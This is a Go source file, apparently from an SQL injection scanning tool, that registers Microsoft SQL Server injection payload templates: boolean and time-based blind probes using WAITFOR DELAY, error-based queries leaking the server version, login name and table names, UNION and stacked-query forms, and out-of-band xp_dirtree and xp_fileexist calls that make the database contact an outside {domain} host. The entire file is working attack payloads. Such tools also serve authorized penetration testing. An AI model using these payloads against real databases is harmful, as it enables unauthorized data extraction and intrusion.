package dbms

func init() {
	register(&Payloads{
		Name: MSSQL,
		Boolean: []BoolPair{
			{True: "{orig} AND 1=1", False: "{orig} AND 1=2"},
			{True: "{orig} AND 1=1-- -", False: "{orig} AND 1=2-- -"},
			{True: "{orig}' AND '1'='1", False: "{orig}' AND '1'='2"},
			{True: "{orig}' AND 'a'='a'", False: "{orig}' AND 'a'='b'"},
			{True: "({orig}) AND 1=1", False: "({orig}) AND 1=2"},
			{True: "{orig} AND (SELECT 1)=1", False: "{orig} AND (SELECT 1)=2"},
		},
		Inline: []BoolPair{
			{True: "{orig} AND (SELECT 8634)=8634", False: "{orig} AND (SELECT 8634)=8635"},
			{True: "{orig}' AND (SELECT 8634)=8634-- -", False: "{orig}' AND (SELECT 8634)=8635-- -"},
			{True: "{orig} AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1", False: "{orig} AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=2"},
		},
		Time: []TimeTpl{
			{Payload: "{orig};WAITFOR DELAY '0:0:{delay}'-- -", Risk: 1},
			{Payload: "{orig}';WAITFOR DELAY '0:0:{delay}';-- -", Risk: 1},
			{Payload: "({orig});WAITFOR DELAY '0:0:{delay}'-- -", Risk: 2},
			{Payload: "{orig} AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3) ELSE 1 END)>0-- -", Risk: 2},
		},
		Error: []string{
			"{orig}';SELECT CONVERT(int,@@version)-- -",
			"{orig}' AND 1=CONVERT(int,@@version)-- -",
			"{orig}';SELECT CONVERT(int,SUSER_SNAME())-- -",
			"{orig}' AND 1=CONVERT(int,SUSER_SNAME())-- -",
			"{orig}' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
			"{orig}'",
		},
		Union: UnionTemplates{
			OrderBy: []string{
				"{orig} ORDER BY {n}-- -",
				"({orig}) ORDER BY {n}-- -",
			},
			UnionSelect: []string{
				"{orig} UNION ALL SELECT {cols}-- -",
				"{orig} UNION SELECT {cols}-- -",
			},
		},
		Stacked: []TimeTpl{
			{Payload: "{orig}';WAITFOR DELAY '0:0:{delay}';-- -", Risk: 2},
			{Payload: "{orig};WAITFOR DELAY '0:0:{delay}'-- -", Risk: 2},
		},
		OOB: []string{
			"{orig}';EXEC master..xp_dirtree '\\\\{domain}\\{unc}';-- -",
			"{orig}';EXEC master..xp_fileexist '\\\\{domain}\\{unc}';-- -",
		},
		StackedOK: true,
	})
}
